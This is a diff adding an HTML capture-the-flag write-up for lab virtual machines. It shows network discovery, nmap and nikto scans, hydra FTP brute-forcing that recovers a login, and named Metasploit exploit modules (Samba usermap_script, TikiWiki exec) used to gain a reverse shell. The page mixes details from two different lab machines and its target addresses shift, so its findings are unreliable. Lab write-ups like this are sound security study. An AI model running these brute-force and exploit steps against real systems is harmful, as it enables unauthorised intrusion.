@@ -1,0 +1,330 @@
+
+<!DOCTYPE html>
+<html>
+<head>
+<title>CTF 1</title>
+<link rel="stylesheet" type="text/css" href="style1.css">
+<!--internal css -->
+<style type="text/css">
+	#lw1{
+  padding-left: 205px;
+}
+	table, th, td {
+  border: 1px solid black;
+  border-collapse: collapse;
+}
+th, td {
+  padding: 3px;
+}
+	.hello
+	{
+	background-color: #ff944d ;
+	
+	height: 10vh;
+	}
+	.hello img
+	{
+     width: 100px;
+     height: 100px;
+     border-radius: 50%;
+
+	}
+	.hello
+	{
+		justify-content: center;
+		display: flex;
+		flex-direction: column;
+        align-items: center;
+	}
+	code.highlighter-rouge {
+    font-family: Courier New, Courier, monospace;
+    font-size: 2;
+    background-color: lightgreen;
+    color: black;
+    padding: 1px 3px;
+    border-radius: 2px;
+ 
+}
+</style>
+</head>
+<body bgcolor="#f1f1f1">
+	
+	<div class="sidebar">
+	<a class="active" href="https://mrhsharma.github.io/web/">Homepage</a>
+  <a href="#a0">
+	<marquee behavior="alternate"><h2>Stapler</h2>
+	</marquee></a>
+  <a href="#1">Reconnaissance</a>
+  <a href="#2">Scanning</a>
+  <a href="#3">Enumeration</a>
+  <a href="#4">Exploitation</a>
+  <a href="#5">Synopsis</a>
+</div><div id=lw1>
+	<p>
+		<h2 id="1" style="text-decoration: underline;">Reconnaissance/Information gathering</h2>
+	<br>	In this I first started with 
+	<br>	<code class="language-plaintext highlighter-rouge">#ifconfig</code>
+	<br>
+	<br>	
+<p>
+ftp://192.168.56.101/
+
+ Currently scanning: 192.168.171.0/16   |   Screen View: Unique Hosts                                                                
+                                                                                                                                     
+ 3 Captured ARP Req/Rep packets, from 3 hosts.   Total size: 180                                                                     
+ _____________________________________________________________________________
+   IP            At MAC Address     Count     Len  MAC Vendor / Hostname      
+ -----------------------------------------------------------------------------
+ 192.168.56.1    0a:00:27:00:00:0d      1      60  Unknown vendor                                                                    
+ 192.168.56.100  08:00:27:2a:10:26      1      60  PCS Systemtechnik GmbH                                                            
+ 192.168.56.101  08:00:27:12:32:e1      1      60  PCS Systemtechnik GmbH                                                            
+
+[2]+  Stopped                 netdiscover
+root@kali:~# arp-scan -l
+Interface: eth0, datalink type: EN10MB (Ethernet)
+Starting arp-scan 1.9.5 with 256 hosts (https://github.com/royhills/arp-scan)
+192.168.56.1	0a:00:27:00:00:0d	(Unknown)
+192.168.56.100	08:00:27:2a:10:26	Cadmus Computer Systems
+192.168.56.101	08:00:27:12:32:e1	Cadmus Computer Systems
+
+3 packets received by filter, 0 packets dropped by kernel
+Ending arp-scan 1.9.5: 256 hosts scanned in 2.152 seconds (118.96 hosts/sec). 3 responded
+root@kali:~# 
+=============================================================
+root@kali:~# nano user.txt
+root@kali:~# nano passw.txt
+root@kali:~# hydra -l user.txt -p passw.txt -e nsr ftp://192.168.56.101
+Hydra v9.0 (c) 2019 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.
+
+Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2020-11-02 23:59:38
+[DATA] max 4 tasks per 1 server, overall 4 tasks, 4 login tries (l:1/p:4), ~1 try per task
+[DATA] attacking ftp://192.168.56.101:21/
+1 of 1 target completed, 0 valid passwords found
+Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2020-11-02 23:59:42
+root@kali:~# hydra -L user.txt -P passw.txt -e nsr ftp://192.168.56.101
+Hydra v9.0 (c) 2019 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.
+
+Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2020-11-03 00:00:39
+[DATA] max 16 tasks per 1 server, overall 16 tasks, 48 login tries (l:4/p:12), ~3 tries per task
+[DATA] attacking ftp://192.168.56.101:21/
+[21][ftp] host: 192.168.56.101   login: elly   password: ylle
+1 of 1 target successfully completed, 1 valid password found
+Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2020-11-03 00:00:48
+==================================================================================
+ nmap -sS -sV 192.168.56.101
+Starting Nmap 7.80 ( https://nmap.org ) at 2020-11-03 00:34 EST
+Nmap scan report for 192.168.56.101
+Host is up (0.0020s latency).
+Not shown: 992 filtered ports
+PORT     STATE  SERVICE     VERSION
+20/tcp   closed ftp-data
+21/tcp   open   ftp         vsftpd 2.0.8 or later
+22/tcp   open   ssh         OpenSSH 7.2p2 Ubuntu 4 (Ubuntu Linux; protocol 2.0)
+53/tcp   open   domain      dnsmasq 2.75
+80/tcp   open   http        PHP cli server 5.5 or later
+139/tcp  open   netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
+666/tcp  open   doom?
+3306/tcp open   mysql       MySQL 5.7.12-0ubuntu1
+1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
+SF-Port666-TCP:V=7.80%I=7%D=11/3%Time=5FA0EBEE%P=x86_64-pc-linux-gnu%r(NUL
+SF:L,2D58,"PK\x03\x04\x14\0\x02\0\x08\0d\x80\xc3Hp\xdf\x15\x81\xaa,\0\0\x1
+SF:52\0\0\x0c\0\x1c\0message2\.jpgUT\t\0\x03\+\x9cQWJ\x9cQWux\x0b\0\x01\x0
+SF:4\xf5\x01\0\0\x04\x14\0\0\0\xadz\x0bT\x13\xe7\xbe\xefP\x94\x88\x88A@\xa
+SF:2\x20\x19\xabUT\xc4T\x11\xa9\x102>\x8a\xd4RDK\x15\x85Jj\xa9\"DL\[E\xa2\
+SF:x0c\x19\x140<\xc4\xb4\xb5\xca\xaen\x89\x8a\x8aV\x11\x91W\xc5H\x20\x0f\x
+SF:b2\xf7\xb6\x88\n\x82@%\x99d\xb7\xc8#;3\[\r_\xcddr\x87\xbd\xcf9\xf7\xaeu
+SF:\xeeY\xeb\xdc\xb3oX\xacY\xf92\xf3e\xfe\xdf\xff\xff\xff=2\x9f\xf3\x99\xd
+SF:3\x08y}\xb8a\xe3\x06\xc8\xc5\x05\x82>`\xfe\x20\xa7\x05:\xb4y\xaf\xf8\xa
+SF:0\xf8\xc0\^\xf1\x97sC\x97\xbd\x0b\xbd\xb7nc\xdc\xa4I\xd0\xc4\+j\xce\[\x
+SF:87\xa0\xe5\x1b\xf7\xcc=,\xce\x9a\xbb\xeb\xeb\xdds\xbf\xde\xbd\xeb\x8b\x
+SF:f4\xfdis\x0f\xeeM\?\xb0\xf4\x1f\xa3\xcceY\xfb\xbe\x98\x9b\xb6\xfb\xe0\x
+SF:dc\]sS\xc5bQ\xfa\xee\xb7\xe7\xbc\x05AoA\x93\xfe9\xd3\x82\x7f\xcc\xe4\xd
+SF:5\x1dx\xa2O\x0e\xdd\x994\x9c\xe7\xfe\x871\xb0N\xea\x1c\x80\xd63w\xf1\xa
+SF:f\xbd&&q\xf9\x97'i\x85fL\x81\xe2\\\xf6\xb9\xba\xcc\x80\xde\x9a\xe1\xe2:
+SF:\xc3\xc5\xa9\x85`\x08r\x99\xfc\xcf\x13\xa0\x7f{\xb9\xbc\xe5:i\xb2\x1bk\
+SF:x8a\xfbT\x0f\xe6\x84\x06/\xe8-\x17W\xd7\xb7&\xb9N\x9e<\xb1\\\.\xb9\xcc\
+SF:xe7\xd0\xa4\x19\x93\xbd\xdf\^\xbe\xd6\xcdg\xcb\.\xd6\xbc\xaf\|W\x1c\xfd
+SF:\xf6\xe2\x94\xf9\xebj\xdbf~\xfc\x98x'\xf4\xf3\xaf\x8f\xb9O\xf5\xe3\xcc\
+SF:x9a\xed\xbf`a\xd0\xa2\xc5KV\x86\xad\n\x7fou\xc4\xfa\xf7\xa37\xc4\|\xb0\
+SF:xf1\xc3\x84O\xb6nK\xdc\xbe#\)\xf5\x8b\xdd{\xd2\xf6\xa6g\x1c8\x98u\(\[r\
+SF:xf8H~A\xe1qYQq\xc9w\xa7\xbe\?}\xa6\xfc\x0f\?\x9c\xbdTy\xf9\xca\xd5\xaak
+SF:\xd7\x7f\xbcSW\xdf\xd0\xd8\xf4\xd3\xddf\xb5F\xabk\xd7\xff\xe9\xcf\x7fy\
+SF:xd2\xd5\xfd\xb4\xa7\xf7Y_\?n2\xff\xf5\xd7\xdf\x86\^\x0c\x8f\x90\x7f\x7f
+SF:\xf9\xea\xb5m\x1c\xfc\xfef\"\.\x17\xc8\xf5\?B\xff\xbf\xc6\xc5,\x82\xcb\
+SF:[\x93&\xb9NbM\xc4\xe5\xf2V\xf6\xc4\t3&M~{\xb9\x9b\xf7\xda-\xac\]_\xf9\x
+SF:cc\[qt\x8a\xef\xbao/\xd6\xb6\xb9\xcf\x0f\xfd\x98\x98\xf9\xf9\xd7\x8f\xa
+SF:7\xfa\xbd\xb3\x12_@N\x84\xf6\x8f\xc8\xfe{\x81\x1d\xfb\x1fE\xf6\x1f\x81\
+SF:xfd\xef\xb8\xfa\xa1i\xae\.L\xf2\\g@\x08D\xbb\xbfp\xb5\xd4\xf4Ym\x0bI\x9
+SF:6\x1e\xcb\x879-a\)T\x02\xc8\$\x14k\x08\xae\xfcZ\x90\xe6E\xcb<C\xcap\x8f
+SF:\xd0\x8f\x9fu\x01\x8dvT\xf0'\x9b\xe4ST%\x9f5\x95\xab\rSWb\xecN\xfb&\xf4
+SF:\xed\xe3v\x13O\xb73A#\xf0,\xd5\xc2\^\xe8\xfc\xc0\xa7\xaf\xab4\xcfC\xcd\
+SF:x88\x8e}\xac\x15\xf6~\xc4R\x8e`wT\x96\xa8KT\x1cam\xdb\x99f\xfb\n\xbc\xb
+SF:cL}AJ\xe5H\x912\x88\(O\0k\xc9\xa9\x1a\x93\xb8\x84\x8fdN\xbf\x17\xf5\xf0
+SF:\.npy\.9\x04\xcf\x14\x1d\x89Rr9\xe4\xd2\xae\x91#\xfbOg\xed\xf6\x15\x04\
+SF:xf6~\xf1\]V\xdcBGu\xeb\xaa=\x8e\xef\xa4HU\x1e\x8f\x9f\x9bI\xf4\xb6GTQ\x
+SF:f3\xe9\xe5\x8e\x0b\x14L\xb2\xda\x92\x12\xf3\x95\xa2\x1c\xb3\x13\*P\x11\
+SF:?\xfb\xf3\xda\xcaDfv\x89`\xa9\xe4k\xc4S\x0e\xd6P0");
+MAC Address: 08:00:27:12:32:E1 (Oracle VirtualBox virtual NIC)
+Service Info: Host: RED; OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 34.46 seconds
+root@kali:~# clear
+-========================================================================
+
+
+root@kali:~# nikto -h 192.168.56.105
+- Nikto v2.1.6
+---------------------------------------------------------------------------
++ Target IP:          192.168.56.105
++ Target Hostname:    192.168.56.105
++ Target Port:        80
++ Start Time:         2020-11-05 15:15:40 (GMT-5)
+---------------------------------------------------------------------------
++ Server: No banner retrieved
++ The anti-clickjacking X-Frame-Options header is not present.
++ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS
++ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type
++ No CGI Directories found (use '-C all' to force check all possible dirs)
++ OSVDB-3093: /.bashrc: User home dir was found with a shell rc file. This may reveal file and path information.
++ OSVDB-3093: /.profile: User home dir with a shell profile was found. May reveal directory information and system configuration.
++ ERROR: Error limit (20) reached for host, giving up. Last error: error reading HTTP response
++ Scan terminated:  20 error(s) and 5 item(s) reported on remote host
++ End Time:           2020-11-05 15:16:07 (GMT-5) (27 seconds)
+---------------------------------------------------------------------------
++ 1 host(s) tested
+
+
+
+</p>	
+	<h2 id="3" style="text-decoration: underline;">Enumeration</h2>
+	
+	<br>	Before trying exploits I try to use them 
+	<br>	like telnet 192.168.56.102,ftp 192.168.56.102 and many more and bruteforcing password
+	<br>	I success in many.
+	<br>	first I use a tool <code class="language-plaintext highlighter-rouge">#nikto</code> on 102	
+	<br>
+	<br>	<a href="sshots\s4.jpg"><img src="sshots\s4.jpg" alt="nikto" width="900" height="400"></a>
+		
+	<br>	Then try to open the ip in browser as indicated in nikto
+	<br>	<a href="sshots\s5.png"><img src="sshots\s5.png" alt="" width="900" height="400"></a>
+	<br>	<a href="sshots\s5a.png"><img src="sshots\s5a.png" alt="" width="900" height="400"></a>
+	<a href="sshots\http192 168 56 102.png"><img src="sshots\s5b.png" alt="" width="800" height="400"></a>
+	<br>	<a href="sshots\s5c.png"><img src="sshots\s5c.png" alt="" width="900" height="400"></a>
+	<br>	<a href="sshots\phpinfo().png" alt="More" >phpfile</a>
+	<br>	<a href="sshots\Index of icons.png" alt="More" >/icons ie a directory</a><br>
+	<br>
+
+	<h2 id="4" style="text-decoration: underline;">Exploitation</h2>	
+	
+	<br>	Then i switch to metasploit
+	<br>	and scan by nmap then i got many port with running services
+	<br>	<a href="sshots\s3.png"><img src="sshots\s3.png" alt="nmap" width="500" height="500"></a>
+	<br>	
+	<br>	Then I search the exploits in database ie in searchsploit
+	<br>	And do the tools ie Scanner, Exploit from port 21 ie On ProFTPD, OpenSSH, telnet, and all. 
+	<br>	Some of them are
+	<br>
+	<br>	<code class="language-plaintext highlighter-rouge">#exploit/unix/ftp/proftpd_modcopy_exec</code> 
+	<br>	<code class="language-plaintext highlighter-rouge">#exploit/unix/ftp/proftpd_133c_backdoor </code>
+	<br>	<code class="language-plaintext highlighter-rouge">#scanner/ssh/ssh_login  </code>
+	<br>	<code class="language-plaintext highlighter-rouge">#scanner/ssh/ssh_login</code> 
+	<br>	<code class="language-plaintext highlighter-rouge">#exploit/unix/webapp/tikiwiki_upload_exec </code>
+	<br>	<code class="language-plaintext highlighter-rouge">#exploit/unix/webapp/tikiwiki_unserialize_exec</code> 
+	<br>	<code class="language-plaintext highlighter-rouge">#exploit/unix/webapp/tikiwiki_jhot_exec </code>
+	<br>
+	<br>	And the one which successfully run are
+	<br>	1. Samba smbd 3.X - 4.X
+	<br>	ie onmost famous smb port ie port 139
+	<br>	we got access to machine
+	<br>		
+	<br>	<code class="language-plaintext highlighter-rouge">#exploit/multi/samba/usermap_script</code> 
+	<br>	<img src="sshots\s6.png" alt="SMB" width="500" height="500"><br>
+			<img src="sshots\s6b.png" alt="SMB" width="500" height="500"><br>
+			<img src="sshots\s6c.png" alt="SMB" width="500" height="500"><br>
+	<br>	2. Apache server 
+	<br>	Exploiting wikitiki php arbitrary code vulnerability
+	<br>	Getting reverse shell on tcp port.
+	<br>
+	<br>	<code class="language-plaintext highlighter-rouge">#exploit/unix/webapp/tikiwiki_graph_formula_exec</code>
+	<br>
+	<br>	<img src="sshots\s8.png" alt="Apache" ><br><br>
+	More details on connection<br>
+	<a href="sshots\s8b.png" alt="More" >Session information</a><br>
+	<a href="sshots\s8c.png" alt="More" >Core commands</a><br>
+	<a href="sshots\s8d.png" alt="More" >system info</a><br>
+	<a href="sshots\s8e.png" alt="More" >wikitiki default dir</a><br>
+	<a href="sshots\s8f.png" alt="More" >directory files</a><br>
+	<a href="sshots\s8h.png" alt="More" >root user data</a><br>
+	<br></p> Interesting files or data found
+	<ul>
+		<br><li>passwd file in etc/<br><a href="sshots\s7.png">
+		<img border="0" alt="passwd" src="sshots\s7.png" width="100" height="100"></a></li>
+		<br><li>Root directory<br><a href="sshots\s9.png">
+		<img border="0" alt="root" src="sshots\s9.png" width="100" height="100"></a></li>
+		<br><li>admin= msadmin and list of vulnerabilitys...Lol..<br><a href="sshots\s10.png">
+		<img border="0" alt="vuln" src="sshots\s10.png" width="100" height="100"></a></li>
+		<br><li> uid of machine<br><a href="sshots\s11.png">
+		<img border="0" alt="" src="sshots\s11.png" width="100" height="100"></a></li>
+		<br><li>Most Imp file robot.txt<br><a href="sshots\s12.png">
+		<img border="0" alt="" src="sshots\s12.png" width="100" height="100"></a></li>
+		<br><li>Session port and other information<br><a href="sshots\s13.png">
+		<img border="0" alt="" src="sshots\s13.png" width="100" height="100"></a></li>
+
+	</ul>
+	
+	<h2 id="5" style="text-decoration: underline;">Synopsis/Reporting</h2>
+	<h3>POC</h3>
+	<p>
+		This machine details
+	<br>	Host is up (0.00068s latency).
+	<br>	OS: Unix
+	<br>	IP: 192.168.56.102
+	<br>	Mac Address: 08:00:27:94:37:C9 (Oracle VirtualBox virtual NIC)
+<br>
+	<br>	Port:
+	<br>	12 open ports
+	<br>	988 closed ports
+		<br>Details of open ports
+		<div>	
+			<table style="background-color:#00FF00, width:500px">
+		<tr><td>21/tcp </td><td>  open </td><td> ftp        </td><td> ProFTPD 1.3.1</td></tr>
+		<tr><td>22/tcp </td><td>  open </td><td> ssh        </td><td> OpenSSH 4.7p1 Debian 8ubuntu1 (protocol 2.0)</td></tr>
+   		<tr><td>23/tcp </td><td>  open </td><td> telnet     </td><td> Linux telnetd</td></tr>
+		<tr><td>25/tcp </td><td>  open </td><td> smtp       </td><td> Postfix smtpd</td></tr>
+		<tr><td>53/tcp </td><td>  open </td><td> domain     </td><td> ISC BIND 9.4.2</td></tr>
+		<tr><td>80/tcp </td><td>  open </td><td> http       </td><td> Apache httpd 2.2.8 ((Ubuntu) PHP/5.2.4-2ubuntu5.10 with Suhosin-Patch)</td></tr>
+		<tr><td>139/tcp</td><td>  open </td><td> netbios-ssn</td><td> Samba smbd 3.X - 4.X (workgroup: WORKGROUP)</td></tr>
+		<tr><td>445/tcp</td><td>  open </td><td> netbios-ssn</td><td> Samba smbd 3.X - 4.X (workgroup: WORKGROUP)</td></tr>
+		<tr><td>3306/tcp</td><td> open </td><td> mysql      </td><td> MySQL 5.0.51a-3ubuntu5</td></tr>
+		<tr><td>5432/tcp</td><td> open </td><td> postgresql </td><td> PostgreSQL DB 8.3.0 - 8.3.7</td></tr>
+		<tr><td>8009/tcp</td><td> open </td><td> ajp13?   </td><td></td></tr>
+		<tr><td>8180/tcp</td><td> open </td><td> http       </td><td> Apache Tomcat/Coyote JSP engine 1.1</td></tr>
+		</table><table style="background-color:#00FF00, width:500px">
+		<tr><td>MAC Address: 08:00:27:94:37:C9 (Oracle VirtualBox virtual NIC)</td></tr>
+		<tr><td>Service Info: host:  metasploitable.localdomain;  OSs: Unix,  Linux; CPE:  cpe:  /o:linux:linux_kernel</td></tr> 
+	</table>
+	</div>
+	<br>	From these smb services ie Samba smbd 3.X - 4.X (workgroup: WORKGROUP) 
+	<br>	on port 139,445 are highly vulnerable.
+	<br>	Apache Server is also highly vulnerable
+	<br>	MySql database is vulnerable.
+	<br>	telnet, ssh password are compromised by enumeration or bruteforcing.
+	<br>	ProFTPD running on ftp ie port 21 is vulnerable too.  
+	
+		<ol>
+			<li><a href="nmap -sC -sV 192.168.56.txt">nmap network</a></li>
+			<li><a href="nmap -sC -sV 192.168.56.1.txt">nmap -sC -sV 192.168.56.1</a></li>
+			<li><a href="nmap -sC -sV 192.168.56.100.txt">nmap -sC -sV 192.168.56.100</a></li>
+			<li><a href="nmap -sC -sV 192.168.56.102.txt">nmap -sC -sV 192.168.56.102</a></li>
+			<li>nikto reports<br>
+			<a href="report_1.html">report_192.168.56.1</a><br>
+			<a href="report_100.html">report_192.168.56.100</a><br>
+			<a href="report_102.html">report_192.168.56.102</a><br>
+			<li><a href="nikto -h 192.168.56.102.txt">nikto -h 192.168.56.102</a></li>
+			
+			</li>
+		</ol>
+		</p></div>
+</body>
+</html>
